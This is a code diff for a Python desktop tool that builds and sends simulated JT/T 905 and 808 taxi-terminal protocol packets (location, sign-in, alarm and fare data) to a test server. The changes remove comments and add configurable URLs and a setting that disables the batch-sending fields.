@@ -1,4 +1,3 @@
-# coding=utf-8
 import binascii
 import csv
 import os
@@ -7,21 +6,26 @@ import tkinter as tk
 from tkinter import *
 from tkinter.colorchooser import askcolor
 from tkinter.ttk import *
-
 import ttkbootstrap as ttk
-
-
+import win32com.client  # TTS
+from tkwebview2.tkwebview2 import WebView2
 from V3ku import *
 from 出租车.V905ku import 报警标志, 车辆状态, 经纬度, 速度, 签退方式, 报警标志1, 车辆状态1, 经纬度1, 速度1, 评价选项, \
     电召订单ID, 交易类型
 from 报警 import *
+import webview
+from tkinter import messagebox
+import sys
+
+is_on = True
+from tkinter.messagebox import *
+import fnmatch
 
 LOG_LINE_NUM = 0
-init_window = ttk.Window()  # 实例化出一个父窗口
+init_window = ttk.Window()
 
-s = ttk.Style()  # 实例化Style
+s = ttk.Style()
 s.theme_use("superhero")
-# menubar = Menu(init_window, tearoff=False)
 
 now_time = time.strftime('%Y%m%d%H%M%S', time.localtime())
 now_time1 = time.strftime('%H%M%S', time.localtime())
@@ -41,14 +45,6 @@ def paste(editor, event=None):
 
 def selectAll(editor, event=None):
     editor.tag_add('sel', '1.0', END)
-
-
-# # # def rightKey(event, editor):
-#     menubar.delete(0, END)
-#     menubar.add_command(label='复制', command=lambda: copy(editor))
-#     menubar.add_command(label='粘贴', command=lambda: paste(editor))
-#     menubar.add_command(label='全选', command=lambda: selectAll(editor))
-#     menubar.post(event.x_root, event.y_root)
 
 
 # V3校验位
@@ -89,7 +85,6 @@ def get_longitude(base_log=None, radius=None):
     t = 2 * math.pi * v
     y = w * math.sin(t)
     longitude = y + base_log
-    # print()
     return str(longitude)[:10]
 
 
@@ -104,13 +99,8 @@ def get_latitude(base_lat=None, radius=None):
     return str(latitude)[:9]
 
 
-is_on = True
-from tkinter.messagebox import *
-import fnmatch
-
 current_directory = os.getcwd()
 
-# 设置MP3文件匹配模式
 mp3_pattern = '*.mp3'
 ico_pattern = '*.ico'
 gif_pattern = '*.gif'
@@ -133,6 +123,10 @@ class MY_GUI(tk.Tk):
         self.baojing = config['905baojing']
         self.baojing808 = config['808baojing']
         self.conf_驾驶员从业资格证号 = config['驾驶员从业资格证号']
+        self.url = config['URL']['url']
+        self.jiexurl = config['URL']['jiexurl']
+        self.Zombie = config['Zombie']['range']
+        self.jinyong = config['Zombie']['jinyong']
 
     def wzhi905(self, su, plsu):
         global data, t
@@ -177,8 +171,7 @@ class MY_GUI(tk.Tk):
                     time.sleep(float(self.times()))
                     if self.ip_on() == '是':
                         s = socket(AF_INET, SOCK_STREAM)
-
-                        s.connect((f'{self.ip()}', int(self.port())))  # 生产
+                        s.connect((f'{self.ip()}', int(self.port())))
                         s.settimeout(5)
                         try:
                             s.send(bytes().fromhex(data))
@@ -213,7 +206,7 @@ class MY_GUI(tk.Tk):
                 if self.ip_on() == '是':
                     s = socket(AF_INET, SOCK_STREAM)
 
-                    s.connect((f'{self.ip()}', int(self.port())))  # 生产
+                    s.connect((f'{self.ip()}', int(self.port())))
                     s.settimeout(5)
                     try:
                         s.send(bytes().fromhex(data))
@@ -283,7 +276,7 @@ class MY_GUI(tk.Tk):
                     time.sleep(float(self.times()))
                     if self.ip_on2() == '是':
                         s = socket(AF_INET, SOCK_STREAM)
-                        s.connect((f'{self.ip2()}', int(self.port2())))  # 生产
+                        s.connect((f'{self.ip2()}', int(self.port2())))
                         s.settimeout(5)
                         try:
                             s.send(bytes().fromhex(data))
@@ -322,7 +315,7 @@ class MY_GUI(tk.Tk):
                 time.sleep(float(self.times()))
                 if self.ip_on2() == '是':
                     s = socket(AF_INET, SOCK_STREAM)
-                    s.connect((f'{self.ip2()}', int(self.port2())))  # 生产
+                    s.connect((f'{self.ip2()}', int(self.port2())))
                     s.settimeout(5)
                     try:
                         s.send(bytes().fromhex(data))
@@ -402,7 +395,7 @@ class MY_GUI(tk.Tk):
                 print('\n' * 1)
             print(data)
             s = socket(AF_INET, SOCK_STREAM)
-            s.connect((f'{self.ip8()}', int(self.port8())))  # 生产
+            s.connect((f'{self.ip8()}', int(self.port8())))
             s.settimeout(5)
             try:
                 s.send(bytes().fromhex(data))
@@ -414,7 +407,7 @@ class MY_GUI(tk.Tk):
             except:
                 self.result_data_Text8.delete(1.0, END)
                 self.result_data_Text8.insert(1.0, "连接超时，未收到服务器响应")
-            time.sleep(1)
+            time.sleep(2)
         self.result_data_Text8.insert(1.0, "\n完成")
         showinfo("发送结果", "发送成功")
 
@@ -437,7 +430,7 @@ class MY_GUI(tk.Tk):
             标识位 = '7E'
             消息ID = '0200'
             消息体属性 = '0023'
-            ISU标识 = self.sbei905  # 10位
+            ISU标识 = self.sbei905
             流水号 = f'{1}'.zfill(4)
             baojing = [
                 self.baojing['紧急报警'],
@@ -511,10 +504,9 @@ class MY_GUI(tk.Tk):
             except:
                 self.result905_Text8.delete(1.0, END)
                 self.result905_Text8.insert(1.0, "连接超时，未收到服务器响应")
-            time.sleep(4)
+            time.sleep(2)
         self.result905_Text8.insert(1.0, "\n完成")
         showinfo("发送结果", "发送成功")
-
 
     def qdao(self, su, plsu):
         count = 0
@@ -537,9 +529,9 @@ class MY_GUI(tk.Tk):
             速度 = self.sdu()[2:].zfill(4).upper()
             方向 = f'{random.randint(12, 20)}'
             时间 = now_time[2:]
-            企业经营许可证号 = '534E3132333435363738390000000000'  # SN123456789
-            驾驶员从业资格证号 = 驾驶员从业资格证号1.zfill(38)  # SN12345678912345678
-            车牌号 = '534E31323435'  # SN1234
+            企业经营许可证号 = '534E3132333435363738390000000000'
+            驾驶员从业资格证号 = 驾驶员从业资格证号1.zfill(38)
+            车牌号 = '534E31323435'
             开机时间 = now_time[:12]
             附加 = '01040000006E0202044C250400000000300103'
             if self.sb_on() == '是':
@@ -567,7 +559,7 @@ class MY_GUI(tk.Tk):
                     if self.ip_on() == '是':
                         s = socket(AF_INET, SOCK_STREAM)
 
-                        s.connect((f'{self.ip()}', int(self.port())))  # 生产
+                        s.connect((f'{self.ip()}', int(self.port())))
                         s.settimeout(5)
                         try:
                             s.send(bytes().fromhex(data))
@@ -604,7 +596,7 @@ class MY_GUI(tk.Tk):
                 time.sleep(float(self.times()))
                 if self.ip_on() == '是':
                     s = socket(AF_INET, SOCK_STREAM)
-                    s.connect((f'{self.ip()}', int(self.port())))  # 生产
+                    s.connect((f'{self.ip()}', int(self.port())))
                     s.settimeout(5)
                     try:
                         s.send(bytes().fromhex(data))
@@ -643,15 +635,15 @@ class MY_GUI(tk.Tk):
             速度 = self.sdu()[2:].zfill(4).upper()
             方向 = f'{random.randint(12, 20)}'
             时间 = now_time[2:]
-            企业经营许可证号 = '534E3132333435363738390000000000'  # SN123456789
-            驾驶员从业资格证号 = 驾驶员从业资格证号1.zfill(38)  # SN12345678912345678
-            车牌号 = '534E31323435'  # SN1235
-            计价器K值 = f'00{random.randint(12, 20)}'  # 计价12
+            企业经营许可证号 = '534E3132333435363738390000000000'
+            驾驶员从业资格证号 = 驾驶员从业资格证号1.zfill(38)
+            车牌号 = '534E31323435'
+            计价器K值 = f'00{random.randint(12, 20)}'
             当班开机时间 = now_time[:12]
             当班关机时间 = now_time[:12]
-            当班里程 = f'000{random.randint(30, 36)}0'  # 格式为XXXXX.X(km)
-            当班营运里程 = f'000{random.randint(30, 36)}0'  # 格式为XXXXX.X(km)
-            车次 = f'00{random.randint(12, 20)}'  # 车次12
+            当班里程 = f'000{random.randint(30, 36)}0'
+            当班营运里程 = f'000{random.randint(30, 36)}0'
+            车次 = f'00{random.randint(12, 20)}'
             计时时间 = now_time1
             总计金额 = f'000{random.randint(12, 20)}0'
             卡收金额 = f'000{random.randint(12, 20)}0'
@@ -690,7 +682,7 @@ class MY_GUI(tk.Tk):
                     time.sleep(float(self.times()))
                     if self.ip_on() == '是':
                         s = socket(AF_INET, SOCK_STREAM)
-                        s.connect((f'{self.ip()}', int(self.port())))  # 生产
+                        s.connect((f'{self.ip()}', int(self.port())))
                         s.settimeout(5)
                         try:
                             s.send(bytes().fromhex(data))
@@ -727,7 +719,7 @@ class MY_GUI(tk.Tk):
                 time.sleep(float(self.times()))
                 if self.ip_on() == '是':
                     s = socket(AF_INET, SOCK_STREAM)
-                    s.connect((f'{self.ip()}', int(self.port())))  # 生产
+                    s.connect((f'{self.ip()}', int(self.port())))
                     s.settimeout(5)
                     try:
                         s.send(bytes().fromhex(data))
@@ -780,14 +772,14 @@ class MY_GUI(tk.Tk):
             方向1 = f'{random.randint(12, 20)}'
             时间1 = now_time[2:]
 
-            营运ID = '3590AA28'  # 001101  0110  01000  01010 101000 101000
+            营运ID = '3590AA28'
             评价ID = '3590AA28'
             评价选项 = '01'
             评价选项扩展 = '0000'
             电召订单ID = '000'.zfill(8)
-            车牌号 = '534E31323535'  # SN1255
-            企业经营许可证号 = '534E3132333435363738393100000000'  # SN1234567891
-            驾驶员从业资格证号 = 驾驶员从业资格证号1.zfill(38)  # SN12345678912345679
+            车牌号 = '534E31323535'  # 4B3132333435
+            企业经营许可证号 = '534E3132333435363738393100000000'
+            驾驶员从业资格证号 = 驾驶员从业资格证号1.zfill(38)
             上车时间 = 时间[:10]
             上车时间1 = 时间[:8] + '00'
             上车 = 时间[6:8].replace(f"{时间[6:8]}", "%02d" % (int(时间[6:8]) + 1))
@@ -797,7 +789,7 @@ class MY_GUI(tk.Tk):
             附加费 = f'000{random.randint(12, 20)}0'
             等待计时时间 = f'0{random.randint(12, 20)}0'
             交易金额 = f'000{random.randint(12, 20)}0'
-            交易类型 = '03'  # 0x00:现金交易：0x01:M1卡交易：0x03：CPU卡交易：0x09:其他
+            交易类型 = '03'
             附加 = '01040000006E0202044C250400000000300103'
             if self.sb_on() == '是':
                 for i in range(int(su), int(plsu)):
@@ -824,7 +816,7 @@ class MY_GUI(tk.Tk):
                     time.sleep(float(self.times()))
                     if self.ip_on() == '是':
                         s = socket(AF_INET, SOCK_STREAM)
-                        s.connect((f'{self.ip()}', int(self.port())))  # 生产
+                        s.connect((f'{self.ip()}', int(self.port())))
                         s.settimeout(5)
                         try:
                             s.send(bytes().fromhex(data))
@@ -861,7 +853,7 @@ class MY_GUI(tk.Tk):
                 time.sleep(float(self.times()))
                 if self.ip_on() == '是':
                     s = socket(AF_INET, SOCK_STREAM)
-                    s.connect((f'{self.ip()}', int(self.port())))  # 生产
+                    s.connect((f'{self.ip()}', int(self.port())))
                     s.settimeout(5)
                     try:
                         s.send(bytes().fromhex(data))
@@ -904,7 +896,7 @@ class MY_GUI(tk.Tk):
                 count += 1
                 if self.ip_on3() == '是':
                     s = socket(AF_INET, SOCK_STREAM)
-                    s.connect((f'{self.ip3()}', int(self.port3())))  # 生产
+                    s.connect((f'{self.ip3()}', int(self.port3())))
                     s.settimeout(5)
                     try:
                         s.send(bytes().fromhex(data))
@@ -947,7 +939,7 @@ class MY_GUI(tk.Tk):
                 count += 1
                 if self.ip_on3() == '是':
                     s = socket(AF_INET, SOCK_STREAM)
-                    s.connect((f'{self.ip3()}', int(self.port3())))  # 生产
+                    s.connect((f'{self.ip3()}', int(self.port3())))
                     s.settimeout(5)
                     try:
                         s.send(bytes().fromhex(data))
@@ -991,7 +983,7 @@ class MY_GUI(tk.Tk):
                 count += 1
                 if self.ip_on3() == '是':
                     s = socket(AF_INET, SOCK_STREAM)
-                    s.connect((f'{self.ip3()}', int(self.port3())))  # 生产
+                    s.connect((f'{self.ip3()}', int(self.port3())))
                     s.settimeout(5)
                     try:
                         s.send(bytes().fromhex(data))
@@ -1046,7 +1038,7 @@ class MY_GUI(tk.Tk):
                 time.sleep(float(self.times4()))
                 if self.ip_on4() == '是':
                     s = socket(AF_INET, SOCK_DGRAM)
-                    s.connect((f'{self.ip4()}', int(self.port4())))  # 生产
+                    s.connect((f'{self.ip4()}', int(self.port4())))
                     s.settimeout(5)
                     try:
                         s.send(bytes().fromhex(data))
@@ -1214,7 +1206,7 @@ class MY_GUI(tk.Tk):
     def thread_it(self, func, *args):
         """ 将函数打包进线程 """
         self.myThread = threading.Thread(target=func, args=args)
-        self.myThread.daemon=True  # 主线程退出就直接让子线程跟随退出,不论是否运行完成。
+        self.myThread.daemon = True
         self.myThread.start()
 
     def sb_hao(self):
@@ -1642,7 +1634,7 @@ class MY_GUI(tk.Tk):
             self.init_window_name.set_value_to_registry('background_color', color)
 
     def zhuti(self):
-        theme_names = s.theme_names()  # 以列表的形式返回多个主题名
+        theme_names = s.theme_names()
         print(theme_names)
         theme_selection = Toplevel(self.init_window_name)
         theme_selection.title("选择主题")
@@ -1669,7 +1661,7 @@ class MY_GUI(tk.Tk):
             value = input_entry.get().strip()
             if value:
                 value = int(value) * float("0.1")
-                self.init_window_name.attributes('-alpha', value)  # 设置窗口透明度
+                self.init_window_name.attributes('-alpha', value)
 
         input_dialog = Toplevel(self.init_window_name)
         input_dialog.title("窗口透明度设置")
@@ -1732,17 +1724,6 @@ class MY_GUI(tk.Tk):
         current_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))
         return current_time
 
-    # def write_log_to_Text4(self, logmsg):
-    #     global LOG_LINE_NUM
-    #     current_time = self.get_current_time4()
-    #     logmsg_in = str(current_time) + " " + str(logmsg) + "\n"  # 换行
-    #     if LOG_LINE_NUM <= 7:
-    #         self.log_data_Text4.insert(END, logmsg_in)
-    #         LOG_LINE_NUM = LOG_LINE_NUM + 1
-    #     else:
-    #         self.log_data_Text4.delete(1.0, 2.0)
-    #         self.log_data_Text4.insert(END, logmsg_in)
-
     def sb_hao5(self):
         sb = self.sbei_Text5.get().strip()
         return sb
@@ -1758,7 +1739,6 @@ class MY_GUI(tk.Tk):
             else:
                 self.result_data_Text3.delete(1.0, END)
                 self.result_data_Text3.insert(END, self.qda(self.su3()))
-            # return 0
         elif src == '2':
             sbb1 = self.sb_hao3()
             if not sbb1:
@@ -1808,7 +1788,7 @@ class MY_GUI(tk.Tk):
             self.result_data_Text5.insert(1.0, tip_content)
             if self.ip_on5() == '是':
                 s = socket(AF_INET, SOCK_STREAM)
-                s.connect((f'{self.ip5()}', int(self.port5())))  # 生产
+                s.connect((f'{self.ip5()}', int(self.port5())))
                 s.settimeout(5)
                 try:
                     s.send(bytes().fromhex(data))
@@ -1851,7 +1831,7 @@ class MY_GUI(tk.Tk):
             self.result_data_Text5.insert(1.0, tip_content)
             if self.ip_on5() == '是':
                 s = socket(AF_INET, SOCK_STREAM)
-                s.connect((f'{self.ip5()}', int(self.port5())))  # 生产
+                s.connect((f'{self.ip5()}', int(self.port5())))
                 s.settimeout(5)
                 try:
                     s.send(bytes().fromhex(t))
@@ -1921,7 +1901,7 @@ class MY_GUI(tk.Tk):
             self.result_data_Text5.insert(1.0, tip_content)
             if self.ip_on5() == '是':
                 s = socket(AF_INET, SOCK_STREAM)
-                s.connect((f'{self.ip5()}', int(self.port5())))  # 生产
+                s.connect((f'{self.ip5()}', int(self.port5())))
                 s.settimeout(5)
                 try:
                     s.send(bytes().fromhex(t))
@@ -1952,7 +1932,7 @@ class MY_GUI(tk.Tk):
             self.result_data_Text5.insert(1.0, tip_content)
             if self.ip_on5() == '是':
                 s = socket(AF_INET, SOCK_STREAM)
-                s.connect((f'{self.ip5()}', int(self.port5())))  # 生产
+                s.connect((f'{self.ip5()}', int(self.port5())))
                 s.settimeout(5)
                 try:
                     s.send(bytes().fromhex(t))
@@ -1975,11 +1955,8 @@ class MY_GUI(tk.Tk):
 
     # 16进制转字符
     def hex_to_str(self, hex_data):
-        # 将16进制数据按照每两位进行分割
         hex_list = [hex_data[i:i + 2] for i in range(0, len(hex_data), 2)]
-        # 使用unhexlify函数将每个16进制数转换为对应的字符
         char_list = [binascii.unhexlify(h) for h in hex_list]
-        # 将所有的字符拼接起来，得到最终的结果
         result = ''.join([c.decode() for c in char_list])
         return result
 
@@ -2138,7 +2115,6 @@ class MY_GUI(tk.Tk):
             else:
                 self.result_data_Text1.delete(1.0, END)
                 self.result_data_Text1.insert(END, self.wzhi905(self.su(), self.plsu()))
-            # return 0
         elif src == '2':
             sbb1 = self.sb_hao()
             if not sbb1:
@@ -2164,12 +2140,10 @@ class MY_GUI(tk.Tk):
                 self.result_data_Text1.delete(1.0, END)
                 self.result_data_Text1.insert(END, self.yyun(self.su(), self.plsu()))
 
-    # @property
     def qo_loginV3(self):
         src = self.init_data_Text5.get().strip()
         print(src)
         if src == '1':
-            # print(self.login(2,1))
             sbb1 = self.sb_hao5()
             print(sbb1)
             if not sbb1:
@@ -2268,12 +2242,11 @@ class MY_GUI(tk.Tk):
             self.result_data_Text1.insert(1.0, "请输入自定义数据")
         else:
             s = socket(AF_INET, SOCK_STREAM)
-            s.connect((f'{self.ip()}', int(self.port())))  # 生产
+            s.connect((f'{self.ip()}', int(self.port())))
             s.send(bytes().fromhex(src))
             send = s.recv(1024).hex()
             print(send.upper())
             print('\n' * 1)
-            # time.sleep(10)
             self.result_data_Text1.delete(1.0, END)
             self.result_data_Text1.insert(1.0, f"{src}\n\n")
             self.result_data_Text1.insert(END, f"服务器应答：{send.upper()}\n")
@@ -2292,12 +2265,11 @@ class MY_GUI(tk.Tk):
             self.result_data_Text2.insert(1.0, "请输入自定义数据")
         else:
             s = socket(AF_INET, SOCK_STREAM)
-            s.connect((f'{self.ip2()}', int(self.port2())))  # 生产
+            s.connect((f'{self.ip2()}', int(self.port2())))
             s.send(bytes().fromhex(t))
             send = s.recv(1024).hex()
             print(send.upper())
             print('\n' * 1)
-            # time.sleep(10)
             self.result_data_Text2.delete(1.0, END)
             self.result_data_Text2.insert(1.0, f"{t}\n\n")
             self.result_data_Text2.insert(END, f"服务器应答：{send.upper()}\n\n")
@@ -2310,12 +2282,11 @@ class MY_GUI(tk.Tk):
             self.result_data_Text3.insert(1.0, "请输入自定义数据")
         else:
             s = socket(AF_INET, SOCK_STREAM)
-            s.connect((f'{self.ip3()}', int(self.port3())))  # 生产
+            s.connect((f'{self.ip3()}', int(self.port3())))
             s.send(bytes().fromhex(src))
             send = s.recv(1024).hex()
             print(send.upper())
             print('\n' * 1)
-            # time.sleep(10)
             self.result_data_Text3.delete(1.0, END)
             self.result_data_Text3.insert(1.0, f"{src}\n\n")
             self.result_data_Text3.insert(END, f"服务器应答：{send.upper()}\n\n")
@@ -2328,40 +2299,40 @@ class MY_GUI(tk.Tk):
             self.result_data_Text4.insert(1.0, "请输入自定义数据")
         else:
             s = socket(AF_INET, SOCK_DGRAM)
-            s.connect((f'{self.ip4()}', int(self.port4())))  # 生产
+            s.connect((f'{self.ip4()}', int(self.port4())))
             s.send(bytes().fromhex(src))
             send = s.recv(1024).hex()
             print(send.upper())
             print('\n' * 1)
-            # time.sleep(10)
             self.result_data_Text4.delete(1.0, END)
             self.result_data_Text4.insert(1.0, f"{src}\n\n")
             self.result_data_Text4.insert(END, f"服务器应答：{send.upper()}\n\n")
             showinfo("发送结果", "发送成功")
 
     def qdo_808jiexq(self):
-        import webview
-        webview.create_window("解析协议数据库", "https://jttools.smallchi.cn/jt808", width=1000, height=800)
+        print("正在打开网站!")
+        webview.create_window("解析协议数据库", f"{self.jiexurl}", width=800, height=600)
         webview.start()
+
+    def search(self):
+        print("正在打开网站!")
+        txt = self.entry.get()
+        if txt.startswith('http://') or txt.startswith('https://'):
+            self.frame1.load_url(txt)
 
     # 设置窗口
     def set_init_window(self):
-        # 905解析数据
         self.init_window_name.title("配置版本  作者 : 姚子奇")
-        self.init_window_name.geometry('1100x618+450+200')
+        self.init_window_name.geometry('1100x602+450+200')
 
         note = Notebook(self.init_window_name)
         pane1 = Frame()
 
         self.init_window_name.menu = Menu(pane1, tearoff=0)
         self.init_window_name.menu.add_command(label="退出应用", command=self.init_window_name.quit)
-        # 添加“置顶”子菜单
         self.init_window_name.menu.add_command(label="窗口置顶", command=self.topmost_on)
-        # 添加“改变颜色”子菜单
         self.init_window_name.menu.add_command(label="修改颜色", command=self.choose_color)
-        # 添加“窗口透明度设置”子菜单
         self.init_window_name.menu.add_command(label="窗口透明度设置", command=self.tm)
-        # 主题切换
         self.init_window_name.menu.add_command(label="主题切换", command=self.zhuti)
         self.init_window_name.bind("<Button-3>", self.show_menu)
 
@@ -2371,68 +2342,68 @@ class MY_GUI(tk.Tk):
         self.ip_Text = Combobox(pane1, width=50, height=2, values=items)
         self.ip_Text.current(0)
         self.ip_Text.grid(row=1, column=0, sticky=W)
-        #
+
         self.port_Text_label = Label(pane1, text="服务器Port")
         self.port_Text_label.grid(row=2, columnspan=2, sticky=N)
         items = (f"{self.conf_905wg_port}", "17700", "17800")
         self.port_Text = Combobox(pane1, width=50, height=2, values=items)
         self.port_Text.current(0)
         self.port_Text.grid(row=3, column=0, sticky=W)
-        #
+
         self.su_Text_label = Label(pane1, text="循环次数")
         self.su_Text_label.grid(row=4, columnspan=2, sticky=W)
         items = ("0", "10")
-        self.su_Text = Combobox(pane1, width=22, height=2, values=items)
+        self.su_Text = Combobox(pane1, width=22, height=2, values=items, state=f'{self.jinyong}')
         self.su_Text.current(0)
         self.su_Text.grid(row=5, column=0, sticky=W)
 
         self.plsu_Text_label = Label(pane1, text="批量上线设备次数")
         self.plsu_Text_label.grid(row=4, columnspan=2, sticky=E)
         items = ("1", "10")
-        self.plsu_Text = Combobox(pane1, width=22, height=2, values=items)
+        self.plsu_Text = Combobox(pane1, width=22, height=2, values=items, state=f'{self.jinyong}')
         self.plsu_Text.current(0)
         self.plsu_Text.grid(row=5, column=0, sticky=E)
-        #
-        #         # 905组成数据
+
+        # 905组成数据
         self.sbei_Text_label = Label(pane1, text="设备号(905设备号12位)")
         self.sbei_Text_label.grid(row=6, column=0)
         items = (f"{self.sbei905}", "101356000000", "101351000000")
         self.sbei_Text = Combobox(pane1, width=50, height=2, values=items)
         self.sbei_Text.current(0)
         self.sbei_Text.grid(row=7, column=0, sticky=N, columnspan=10)
-        #
-        #         # 经纬度随机
+
+        # 经纬度随机
         self.on_ = Button(pane1, text="随机经纬度", width=10, command=self.button_mode)
         self.on_.grid(row=9, column=10)
-        #
+
         self.wd_Text_label = Label(pane1, text="纬度")
         self.wd_Text_label.grid(row=8, column=0)
         items = (f"{self.conf_wd1}", "23.012173", "32.330217")
         self.wd_Text = Combobox(pane1, width=50, height=2, values=items)
         self.wd_Text.current(0)
         self.wd_Text.grid(row=9, column=0, sticky=N, columnspan=10)
-        #
+
         self.jd_Text_label = Label(pane1, text="经度")
         self.jd_Text_label.grid(row=10, column=0)
         items = (f"{self.conf_jd1}", "114.340462", "104.903551")
         self.jd_Text = Combobox(pane1, width=50, height=2, values=items)
         self.jd_Text.current(0)
         self.jd_Text.grid(row=11, column=0, sticky=N, columnspan=10)
-        #
+
         self.ip_on_Label = Label(pane1, text="发服务器")
         self.ip_on_Label.grid(row=11, column=10, sticky=N)
         items = ("否", "是")
         self.ip_on_Text = Combobox(pane1, width=2, height=3, values=items)
         self.ip_on_Text.current(0)
         self.ip_on_Text.grid(row=12, column=10, columnspan=1, sticky=N)
-        #
+
         self.sb_on_Label = Label(pane1, text="批量上线")
         self.sb_on_Label.grid(row=15, column=10, sticky=N)
         items = ("否", "是")
-        self.sb_on_Text = Combobox(pane1, width=2, height=3, values=items)
+        self.sb_on_Text = Combobox(pane1, width=2, height=3, values=items, state=f'{self.jinyong}')
         self.sb_on_Text.current(0)
         self.sb_on_Text.grid(row=16, column=10, columnspan=1, sticky=N)
-        #
+
         self.baoj_Text_label = Label(pane1, text="报警")
         self.baoj_Text_label.grid(row=12, column=0)
         items = (
@@ -2445,14 +2416,14 @@ class MY_GUI(tk.Tk):
         self.baoji_Text = Combobox(pane1, width=50, height=12, values=items)
         self.baoji_Text.current(0)
         self.baoji_Text.grid(row=13, column=0, sticky=N, columnspan=10)
-        #
+
         self.times_Text_label = Label(pane1, text="发送停顿时间")
         self.times_Text_label.grid(row=14, column=11)
         items = ("1", "0.5", "1.5", "2")
         self.times_Text = Combobox(pane1, width=60, height=20, values=items)
         self.times_Text.current(0)
         self.times_Text.grid(row=15, column=11, sticky=N)
-        #
+
         self.init_data_label1 = Label(pane1,
                                       text="位置数据包请按1,签到数据包请按2,签退数据包请按3,运营数据包请按4")
         self.init_data_label1.grid(row=14, column=0, sticky=N)
@@ -2461,7 +2432,7 @@ class MY_GUI(tk.Tk):
         self.init_data_Text1.current(0)
         self.init_data_Text1.grid(row=15, column=0, columnspan=10, sticky=N)
         self.init_data_Text1.bind("<<ComboboxSelected>>", self.getMon)
-        #
+
         self.sdu_Text_label = Label(pane1, text="速度")
         self.sdu_Text_label.grid(row=16, column=11, sticky=W)
         items = ("10", "20", "30", "40")
@@ -2476,7 +2447,6 @@ class MY_GUI(tk.Tk):
         self.lic_Text1.current(0)
         self.lic_Text1.grid(row=17, column=11, sticky=E)
 
-        #
         self.driver_Text_label = Label(pane1, text="驾驶员行驶证")
         self.driver_Text_label.grid(row=16, column=0)
         items = ()
@@ -2486,31 +2456,31 @@ class MY_GUI(tk.Tk):
         self.ztai_Text_label = Label(pane1, text="车辆状态")
         self.ztai_Text_label.grid(row=18, column=11)
         items = (
-            "ACC开和载客", "卫星定位","不定位", "停运状态", "预约任务车", "南纬", "西经", "空转重", "重转空", "ACC开", "重车",
+            "ACC开和载客", "卫星定位", "不定位", "停运状态", "预约任务车", "南纬", "西经", "空转重", "重转空", "ACC开",
+            "重车",
             "车辆油路断开", "车辆电路断开", "车门加锁", "车辆锁定", "已达到限制营运次数时间")
         self.ztai_Text = Combobox(pane1, width=60, height=20, values=items)
         self.ztai_Text.grid(row=19, column=11)
         self.ztai_Text.current(0)
-        #
+
         self.data_label = Label(pane1, text="自定义发送(选择服务器ip和port端口)")
         self.data_label.grid(row=18, column=0, sticky=N)
         items = ()
         self.data_Text = Combobox(pane1, width=50, height=2, values=items)
         self.data_Text.grid(row=19, column=0, sticky=N)
 
-        self.result_Text = Button(pane1, text="发送", command=lambda: self.thread_it(self.qo_send))
+        self.result_Text = Button(pane1, text="自定义发送", command=lambda: self.thread_it(self.qo_send))
         self.result_Text.grid(row=19, column=10)
 
         self.result_data_label1 = Label(pane1, text="输出结果")
         self.result_data_label1.grid(row=0, column=11)
-        #
-        #         # self.init_data_Text1.bind("<Button-3>", lambda x: rightKey(x, self.init_data_Text1))
+
         self.result_data_Text1 = Text(pane1, width=85, height=20, relief='solid')
         self.result_data_Text1.grid(row=1, column=11, rowspan=13, columnspan=15)
-        #         # self.result_data_Text1.bind("<Button-3>", lambda x: rightKey(x, self.result_data_Text1))
+
         # 按钮
-        self.str_trans_to_md5_button = Button(pane1, text="专用905生成", width=10,
-                                              command=lambda: self.thread_it(self.qo_login))  # 调用内部方法  加()为直接调用
+        self.str_trans_to_md5_button = Button(pane1, text="专用905发送", width=10,
+                                              command=lambda: self.thread_it(self.qo_login))
         self.str_trans_to_md5_button.grid(row=5, column=10)
         pane2 = Frame()
 
@@ -2532,45 +2502,43 @@ class MY_GUI(tk.Tk):
         self.su_Text_label2 = Label(pane2, text="循环发送次数")
         self.su_Text_label2.grid(row=4, columnspan=2, sticky=W)
         items = ("0", "10")
-        self.su_Text2 = Combobox(pane2, width=22, height=2, values=items)
+        self.su_Text2 = Combobox(pane2, width=22, height=2, values=items, state=f'{self.jinyong}')
         self.su_Text2.current(0)
         self.su_Text2.grid(row=5, column=0, sticky=W)
 
         self.plsu2_Text_label2 = Label(pane2, text="批量上线设备次数")
         self.plsu2_Text_label2.grid(row=4, columnspan=2, sticky=E)
         items = ("1", "10")
-        self.plsu2_Text2 = Combobox(pane2, width=22, height=2, values=items)
+        self.plsu2_Text2 = Combobox(pane2, width=22, height=2, values=items, state=f'{self.jinyong}')
         self.plsu2_Text2.current(0)
         self.plsu2_Text2.grid(row=5, column=0, sticky=E)
-        #
-        #
-        # # 905组成数据
+
+        # 905组成数据
         self.sbei_Text_label2 = Label(pane2, text="808部标设备号11位")
         self.sbei_Text_label2.grid(row=6, column=0, columnspan=1, sticky=N)
         items = (f"{self.sbei808}", "10356000000", "10351000000")
         self.sbei_Text2 = Combobox(pane2, width=50, height=2, values=items)
         self.sbei_Text2.current(0)
         self.sbei_Text2.grid(row=7, column=0, sticky=N, columnspan=1)
-        #
-        #
-        # # 经纬度随机
+
+        #  经纬度随机
         self.on_ = Button(pane2, text="随机经纬度", width=10, command=self.button_mode2)
         self.on_.grid(row=9, column=10)
-        #
+
         self.wd_Text_label2 = Label(pane2, text="纬度")
         self.wd_Text_label2.grid(row=8, column=0, columnspan=1, sticky=N)
         items = (f"{self.conf_wd1}", "23.012173", "32.330217")
         self.wd_Text2 = Combobox(pane2, width=50, height=2, values=items)
         self.wd_Text2.current(0)
         self.wd_Text2.grid(row=9, column=0, sticky=N, columnspan=1)
-        #
+
         self.jd_Text_label2 = Label(pane2, text="经度")
         self.jd_Text_label2.grid(row=10, column=0, columnspan=1, sticky=N)
         items = (f"{self.conf_jd1}", "114.340462", "104.903551")
         self.jd_Text2 = Combobox(pane2, width=50, height=2, values=items)
         self.jd_Text2.current(0)
         self.jd_Text2.grid(row=11, column=0, sticky=N, columnspan=1)
-        #
+
         self.ip_on_Label2 = Label(pane2, text="发服务器")
         self.ip_on_Label2.grid(row=11, column=10, sticky=N)
         items = ("否", "是")
@@ -2581,10 +2549,10 @@ class MY_GUI(tk.Tk):
         self.sb_on_Label2 = Label(pane2, text="批量上线")
         self.sb_on_Label2.grid(row=15, column=10, sticky=N)
         items = ("否", "是")
-        self.sb_on_Text2 = Combobox(pane2, width=2, height=3, values=items)
+        self.sb_on_Text2 = Combobox(pane2, width=2, height=3, values=items, state=f'{self.jinyong}')
         self.sb_on_Text2.current(0)
         self.sb_on_Text2.grid(row=16, column=10, columnspan=1, sticky=N)
-        #
+
         self.baoj_Text_label2 = Label(pane2, text="报警")
         self.baoj_Text_label2.grid(row=12, column=0, columnspan=1, sticky=N)
